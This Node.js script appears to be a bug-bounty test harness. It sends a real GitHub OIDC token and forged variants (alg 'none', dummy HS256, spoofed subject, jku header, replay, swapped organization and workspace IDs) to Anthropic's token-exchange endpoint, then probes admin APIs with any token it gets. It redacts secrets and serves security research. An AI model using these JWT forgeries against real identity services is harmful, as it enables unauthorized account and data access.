#!/usr/bin/env node

import { mkdir, writeFile } from "node:fs/promises";
import { createHash } from "node:crypto";

const BASE_URL = process.env.ANTHROPIC_BASE_URL || "https://api.anthropic.com";
const VERSION = process.env.ANTHROPIC_VERSION || "2023-06-01";
const AUDIENCE = process.env.INPUT_AUDIENCE || "https://api.anthropic.com";
const EXPERIMENT = process.env.INPUT_EXPERIMENT || "legacy_suite";
const OUT_DIR = "evidence";

function sha256(value) {
  return createHash("sha256").update(String(value)).digest("hex");
}

function b64urlJson(value) {
  return Buffer.from(JSON.stringify(value))
    .toString("base64")
    .replaceAll("+", "-")
    .replaceAll("/", "_")
    .replaceAll("=", "");
}

function b64urlDecode(part) {
  const padded = `${part}${"=".repeat((4 - (part.length % 4)) % 4)}`;
  return Buffer.from(padded.replaceAll("-", "+").replaceAll("_", "/"), "base64").toString("utf8");
}

function decodeJwt(jwt) {
  const [headerPart, payloadPart, signaturePart = ""] = jwt.split(".");
  return {
    header: JSON.parse(b64urlDecode(headerPart)),
    payload: JSON.parse(b64urlDecode(payloadPart)),
    signature_sha256: sha256(signaturePart),
    signature_length: signaturePart.length,
  };
}

function sanitizeString(value) {
  if (typeof value !== "string") return value ?? null;
  return value
    .replace(/sk-ant-[A-Za-z0-9._-]+/g, "[redacted:anthropic-token]")
    .replace(/Bearer\s+[A-Za-z0-9._~+/=-]+/gi, "Bearer [redacted]")
    .replace(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g, "[redacted:jwt]");
}

function redact(value) {
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value).map(([key, child]) => {
        if (/access_token|refresh_token|authorization|api[-_]?key|secret|token|assertion/i.test(key)) {
          return [key, "[redacted:sensitive-field]"];
        }
        return [key, redact(child)];
      }),
    );
  }
  if (typeof value === "string") return sanitizeString(value);
  return value;
}

async function getGithubOidc(audience) {
  const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!requestUrl || !requestToken) {
    throw new Error("GitHub OIDC environment variables are missing. Check id-token: write permission.");
  }
  const url = new URL(requestUrl);
  url.searchParams.set("audience", audience);
  const res = await fetch(url, {
    headers: {
      authorization: `Bearer ${requestToken}`,
      accept: "application/json",
    },
  });
  const body = await res.json();
  if (!res.ok || typeof body.value !== "string") {
    throw new Error(`GitHub OIDC request failed: ${res.status} ${JSON.stringify(redact(body))}`);
  }
  return body.value;
}

async function parseJsonResponse(res) {
  const text = await res.text();
  const contentType = res.headers.get("content-type") || "";
  let parsed = text;
  if (contentType.includes("json")) {
    try {
      parsed = text ? JSON.parse(text) : null;
    } catch {
      parsed = text;
    }
  }
  return { text, contentType, parsed };
}

async function exchange(label, assertion, overrides = {}) {
  const body = {
    grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
    assertion,
    organization_id: process.env.ANTHROPIC_ORGANIZATION_ID,
    workspace_id: process.env.ANTHROPIC_WORKSPACE_ID,
    federation_rule_id: process.env.ANTHROPIC_FEDERATION_RULE_ID,
    service_account_id: process.env.ANTHROPIC_SERVICE_ACCOUNT_ID,
    ...overrides,
  };

  const res = await fetch(`${BASE_URL}/v1/oauth/token`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "anthropic-version": VERSION,
      "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    },
    body: JSON.stringify(body),
  });
  const { text, contentType, parsed } = await parseJsonResponse(res);
  const result = {
    label,
    status: res.status,
    ok: res.ok,
    content_type: contentType,
    body_sha256: sha256(text),
    access_token_returned: typeof parsed?.access_token === "string",
    access_token_sha256: typeof parsed?.access_token === "string" ? sha256(parsed.access_token) : null,
    token_type: parsed?.token_type ?? null,
    expires_in: parsed?.expires_in ?? null,
    error_type: sanitizeString(parsed?.error?.type ?? parsed?.error ?? null),
    error_message: sanitizeString(parsed?.error?.message ?? parsed?.error_description ?? null),
    body_preview: redact(parsed),
  };
  if (typeof parsed?.access_token === "string") {
    Object.defineProperty(result, "_accessTokenForSmokeOnly", {
      value: parsed.access_token,
      enumerable: false,
    });
  }
  return result;
}

async function adminSmoke(label, accessToken) {
  const endpoints = [
    ["workspaces", "/v1/organizations/workspaces"],
    ["users", "/v1/organizations/users"],
    ["invites", "/v1/organizations/invites"],
    ["api_keys", "/v1/organizations/api_keys"],
    ["usage_report_messages", "/v1/organizations/usage_report/messages"],
  ];
  const results = [];
  for (const [name, path] of endpoints) {
    const res = await fetch(`${BASE_URL}${path}`, {
      method: "GET",
      headers: {
        "anthropic-version": VERSION,
        authorization: `Bearer ${accessToken}`,
        "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
      },
    });
    const { text, contentType, parsed } = await parseJsonResponse(res);
    results.push({
      name,
      path,
      status: res.status,
      ok: res.ok,
      content_type: contentType,
      body_sha256: sha256(text),
      error_type: sanitizeString(parsed?.error?.type ?? parsed?.error ?? null),
      error_message: sanitizeString(parsed?.error?.message ?? null),
      body_preview: res.ok ? "[success body omitted]" : redact(parsed),
    });
  }
  return {
    label,
    any_admin_endpoint_ok: results.some((item) => item.ok),
    results,
  };
}

async function messageSmoke(label, accessToken) {
  const res = await fetch(`${BASE_URL}/v1/messages`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "anthropic-version": VERSION,
      authorization: `Bearer ${accessToken}`,
      "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    },
    body: JSON.stringify({
      model: process.env.ANTHROPIC_TEST_MODEL || "claude-haiku-4-5-20251001",
      max_tokens: 1,
      messages: [{ role: "user", content: "Reply OK." }],
    }),
  });
  const { text, contentType, parsed } = await parseJsonResponse(res);
  return {
    label,
    status: res.status,
    ok: res.ok,
    content_type: contentType,
    body_sha256: sha256(text),
    message_id: typeof parsed?.id === "string" ? parsed.id : null,
    error_type: sanitizeString(parsed?.error?.type ?? parsed?.error ?? null),
    error_message: sanitizeString(parsed?.error?.message ?? null),
    body_preview: res.ok ? "[success body omitted]" : redact(parsed),
  };
}

function unsignedJwtFrom(decoded, payloadOverrides = {}, headerOverrides = {}) {
  const header = { ...decoded.header, alg: "none", ...headerOverrides };
  const payload = { ...decoded.payload, ...payloadOverrides };
  return `${b64urlJson(header)}.${b64urlJson(payload)}.`;
}

function dummySignedJwtFrom(decoded, payloadOverrides = {}, headerOverrides = {}) {
  const header = { ...decoded.header, alg: "HS256", kid: "h1-dummy", ...headerOverrides };
  const payload = { ...decoded.payload, ...payloadOverrides };
  return `${b64urlJson(header)}.${b64urlJson(payload)}.${Buffer.from("dummy-signature").toString("base64url")}`;
}

function requireExchangeVars() {
  const required = [
    "ANTHROPIC_ORGANIZATION_ID",
    "ANTHROPIC_WORKSPACE_ID",
    "ANTHROPIC_FEDERATION_RULE_ID",
    "ANTHROPIC_SERVICE_ACCOUNT_ID",
  ];
  return required.filter((name) => !process.env[name]);
}

function fingerprintExchangeOverrides(overrides = {}) {
  const keys = ["organization_id", "workspace_id", "federation_rule_id", "service_account_id"];
  return Object.fromEntries(
    keys.map((key) => [
      `${key}_sha256`,
      typeof overrides[key] === "string" ? sha256(overrides[key]) : null,
    ]),
  );
}

function variantForExperiment(name) {
  const dummy = {
    dummy_workspace_id: "wrkspc_01H1DummyWorkspaceBoundaryTest0000",
    dummy_service_account_id: "svac_01H1DummyServiceAccountTest0000",
    dummy_federation_rule_id: "fdrl_01H1DummyFederationRuleTest0000",
    dummy_organization_id: "00000000-0000-4000-8000-000000000001",
  };
  const variants = {
    alt_workspace_id: ["workspace_id", process.env.ANTHROPIC_ALT_WORKSPACE_ID],
    alt_service_account_id: ["service_account_id", process.env.ANTHROPIC_ALT_SERVICE_ACCOUNT_ID],
    alt_federation_rule_id: ["federation_rule_id", process.env.ANTHROPIC_ALT_FEDERATION_RULE_ID],
    alt_organization_id: ["organization_id", process.env.ANTHROPIC_ALT_ORGANIZATION_ID],
    dummy_workspace_id: ["workspace_id", dummy.dummy_workspace_id],
    dummy_service_account_id: ["service_account_id", dummy.dummy_service_account_id],
    dummy_federation_rule_id: ["federation_rule_id", dummy.dummy_federation_rule_id],
    dummy_organization_id: ["organization_id", dummy.dummy_organization_id],
  };
  const selected = variants[name];
  if (!selected) return null;
  const [field, value] = selected;
  if (!value) return { missing: field };
  return { field, overrides: { [field]: value } };
}

function classifySelectedExperiment(name, control, variant, safeClaims) {
  const wrongAudience = AUDIENCE !== "https://api.anthropic.com";
  const wrongRepo = safeClaims.repository !== "hyunjun12312/h1-anthropic-api-wif-jwt-lab";
  const wrongRef = safeClaims.ref !== "refs/heads/master";
  if (wrongAudience) {
    return control.access_token_returned
      ? "candidate_high_real_github_oidc_wrong_audience_accepted"
      : "rejected_real_github_oidc_wrong_audience_blocked";
  }
  if (wrongRepo) {
    return control.access_token_returned
      ? "candidate_high_real_github_oidc_wrong_repo_accepted"
      : "rejected_real_github_oidc_wrong_repo_blocked";
  }
  if (wrongRef) {
    return control.access_token_returned
      ? "candidate_high_real_github_oidc_wrong_ref_accepted"
      : "rejected_real_github_oidc_wrong_ref_blocked";
  }
  if (!control.access_token_returned) return "setup_failed_control_exchange_rejected";
  if (!variant) return "baseline_control_exchange_accepted";
  if (!variant.access_token_returned) return `rejected_${name}_blocked`;
  if (name.includes("service_account")) return "candidate_critical_service_account_selection_bypass";
  if (name.includes("organization")) return "candidate_critical_cross_org_exchange";
  if (name.includes("federation_rule")) return "candidate_high_federation_rule_not_bound";
  if (name.includes("workspace")) return "candidate_high_workspace_boundary_bypass";
  if (name.includes("replay")) return "candidate_high_jti_replay_accepted";
  return "candidate_high_boundary_check_accepted";
}

async function runLegacySuite(evidence, jwt, decoded, safeClaims) {
  const control = await exchange("control-real-github-oidc-jwt", jwt);
  evidence.exchange.results.push(control);

  const replay = await exchange("replay-same-real-github-oidc-jwt", jwt);
  evidence.exchange.results.push(replay);

  if (process.env.ANTHROPIC_ALT_WORKSPACE_ID) {
    evidence.exchange.results.push(
      await exchange("workspace-mismatch-alt-workspace-id", jwt, {
        workspace_id: process.env.ANTHROPIC_ALT_WORKSPACE_ID,
      }),
    );
  }

  if (typeof control._accessTokenForSmokeOnly === "string") {
    evidence.exchange.message_smoke = await messageSmoke(
      "control-access-token-message-smoke",
      control._accessTokenForSmokeOnly,
    );
  }

  const mutations = [
    ["unsigned-alg-none-same-claims", unsignedJwtFrom(decoded)],
    ["dummy-hs256-same-claims", dummySignedJwtFrom(decoded)],
    ["unsigned-wrong-audience", unsignedJwtFrom(decoded, { aud: "urn:h1-wrong-audience" })],
    [
      "unsigned-wrong-sub",
      unsignedJwtFrom(decoded, {
        sub: "repo:attacker/example:ref:refs/heads/main",
        repository: "attacker/example",
      }),
    ],
    ["unsigned-expired-token", unsignedJwtFrom(decoded, { iat: 1, nbf: 1, exp: 2 })],
    [
      "unsigned-jku-header",
      unsignedJwtFrom(decoded, {}, { jku: "https://example.invalid/.well-known/jwks.json", kid: "h1-jku-test" }),
    ],
  ];
  for (const [label, assertion] of mutations) {
    evidence.exchange.results.push(await exchange(label, assertion));
  }

  const acceptedBoundaryBypasses = evidence.exchange.results.filter(
    (item) => item.label !== "control-real-github-oidc-jwt" && item.access_token_returned,
  );
  if (!control.access_token_returned) {
    evidence.classification = classifySelectedExperiment("legacy_suite", control, null, safeClaims);
  } else if (acceptedBoundaryBypasses.length) {
    evidence.classification = "candidate_high_boundary_check_accepted";
  } else {
    evidence.classification = "rejected_mutated_jwts_blocked";
  }
}

async function runSelectedExperiment(evidence, jwt, safeClaims) {
  const control = await exchange("control-real-github-oidc-jwt", jwt);
  evidence.exchange.results.push(control);

  let variant = null;
  if (EXPERIMENT === "baseline") {
    // Baseline only: prove the valid GitHub OIDC token can still mint a scoped Anthropic token.
  } else if (EXPERIMENT === "replay_same_jti") {
    variant = await exchange("variant-replay-same-real-github-oidc-jwt", jwt);
    evidence.exchange.results.push(variant);
  } else {
    const selected = variantForExperiment(EXPERIMENT);
    if (!selected) {
      evidence.classification = `setup_unknown_experiment_${EXPERIMENT}`;
      return;
    }
    if (selected.missing) {
      evidence.classification = `setup_missing_${selected.missing}_for_${EXPERIMENT}`;
      return;
    }
    evidence.exchange.variant_request_body_fingerprint = fingerprintExchangeOverrides(selected.overrides);
    variant = await exchange(`variant-${EXPERIMENT}`, jwt, selected.overrides);
    evidence.exchange.results.push(variant);
  }

  if (typeof control._accessTokenForSmokeOnly === "string" && EXPERIMENT === "baseline") {
    evidence.exchange.message_smoke = await messageSmoke(
      "control-access-token-message-smoke",
      control._accessTokenForSmokeOnly,
    );
    evidence.exchange.admin_smoke = await adminSmoke(
      "control-access-token-admin-api-smoke",
      control._accessTokenForSmokeOnly,
    );
  }

  evidence.classification = classifySelectedExperiment(EXPERIMENT, control, variant, safeClaims);
}

async function main() {
  await mkdir(OUT_DIR, { recursive: true });
  const jwt = await getGithubOidc(AUDIENCE);
  const decoded = decodeJwt(jwt);

  const safeClaims = {
    iss: decoded.payload.iss,
    aud: decoded.payload.aud,
    sub: decoded.payload.sub,
    repository: decoded.payload.repository,
    repository_owner: decoded.payload.repository_owner,
    repository_id: decoded.payload.repository_id,
    repository_owner_id: decoded.payload.repository_owner_id,
    ref: decoded.payload.ref,
    ref_type: decoded.payload.ref_type,
    sha: decoded.payload.sha,
    workflow: decoded.payload.workflow,
    workflow_ref: decoded.payload.workflow_ref,
    job_workflow_ref: decoded.payload.job_workflow_ref,
    event_name: decoded.payload.event_name,
    actor: decoded.payload.actor,
    actor_id: decoded.payload.actor_id,
    run_id: decoded.payload.run_id,
    run_attempt: decoded.payload.run_attempt,
  };

  const evidence = {
    generated_at: new Date().toISOString(),
    scope_asset: "api.anthropic.com / API & SDKs",
    claim_tested: "GitHub OIDC JWT claim collection and selected Anthropic WIF token-exchange boundary checks.",
    experiment: {
      name: EXPERIMENT,
      one_variable_at_a_time: EXPERIMENT !== "legacy_suite",
      expected_non_vulnerable: "Only the exact configured GitHub OIDC subject/audience/rule/service-account/workspace/org combination should mint a token.",
      vulnerable_if: "A token is minted when a request-controlled org/workspace/rule/service_account parameter is swapped away from the configured target.",
    },
    safety: {
      github_oidc_jwt_not_logged: true,
      github_oidc_jwt_sha256_only: sha256(jwt),
      anthopic_access_tokens_not_logged: true,
      no_third_party_data_accessed: true,
    },
    github_oidc: {
      requested_audience: AUDIENCE,
      header: decoded.header,
      signature_length: decoded.signature_length,
      signature_sha256: decoded.signature_sha256,
      safe_claims: safeClaims,
      suggested_rule_condition:
        safeClaims.repository && safeClaims.sub
          ? `repository == '${safeClaims.repository}' and sub == '${safeClaims.sub}'`
          : null,
    },
    exchange: {
      attempted: process.env.RUN_EXCHANGE === "true",
      missing_variables: requireExchangeVars(),
      results: [],
      message_smoke: null,
      admin_smoke: null,
    },
    classification: "claims_collected_only",
  };

  if (process.env.RUN_EXCHANGE === "true") {
    if (evidence.exchange.missing_variables.length) {
      evidence.classification = "setup_incomplete_missing_anthropic_wif_variables";
    } else if (EXPERIMENT === "legacy_suite") {
      await runLegacySuite(evidence, jwt, decoded, safeClaims);
    } else {
      await runSelectedExperiment(evidence, jwt, safeClaims);
    }
  }

  const outPath = `${OUT_DIR}/anthropic-wif-jwt-boundary-evidence.json`;
  await writeFile(outPath, `${JSON.stringify(evidence, null, 2)}\n`);
  console.log(
    JSON.stringify(
      {
        outPath,
        classification: evidence.classification,
        experiment: evidence.experiment,
        safe_claims: evidence.github_oidc.safe_claims,
        suggested_rule_condition: evidence.github_oidc.suggested_rule_condition,
        exchange: {
          attempted: evidence.exchange.attempted,
          missing_variables: evidence.exchange.missing_variables,
          variant_request_body_fingerprint: evidence.exchange.variant_request_body_fingerprint || null,
          summary: evidence.exchange.results.map((item) => ({
            label: item.label,
            status: item.status,
            access_token_returned: item.access_token_returned,
            error_type: item.error_type,
            error_message: item.error_message,
          })),
          message_smoke: evidence.exchange.message_smoke
            ? {
                status: evidence.exchange.message_smoke.status,
                ok: evidence.exchange.message_smoke.ok,
                message_id: evidence.exchange.message_smoke.message_id,
                error_type: evidence.exchange.message_smoke.error_type,
              }
            : null,
          admin_smoke: evidence.exchange.admin_smoke
            ? {
                any_admin_endpoint_ok: evidence.exchange.admin_smoke.any_admin_endpoint_ok,
                summary: evidence.exchange.admin_smoke.results.map((item) => ({
                  name: item.name,
                  status: item.status,
                  ok: item.ok,
                  error_type: item.error_type,
                  error_message: item.error_message,
                })),
              }
            : null,
        },
      },
      null,
      2,
    ),
  );
}

main().catch((error) => {
  console.error(error instanceof Error ? error.stack || error.message : String(error));
  process.exit(1);
});

